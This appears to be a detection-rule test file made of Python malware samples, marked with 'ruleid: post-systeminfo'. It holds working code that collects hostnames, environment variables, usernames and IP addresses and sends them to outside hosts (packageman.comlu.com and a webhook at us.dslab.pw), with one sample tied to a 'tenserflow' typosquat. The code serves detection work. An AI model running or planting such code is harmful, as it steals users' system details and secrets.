try:
  info = socket.gethostname()+' '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  posty = "paste="
  for i in xrange(0,len(info)):
    if info[i].isalnum():
      posty += info[i]
    else:
      posty += ("%%%02X" % ord(info[i]))
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("packageman.comlu.com", 80))
  
  # ruleid: post-systeminfo
  s.send("POST / HTTP/1.1\r\n"+
  "User-Agent: Python\r\n"+
  "Host: packageman.comlu.com\r\n"+
  "Content-Type: application/x-www-form-urlencoded\r\n"+
  "Content-Length: "+str(len(posty))+"\r\n\r\n"+posty)
  s.recv(2048)

  s.send("HI")
except:
  pass

  


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        "title": "%s@%s@tenserflow" % (username, ip),
        "body": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }
    
    # ruleid: post-systeminfo
    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode("utf-8", errors='ignore'),
        headers=headers
    )

detect()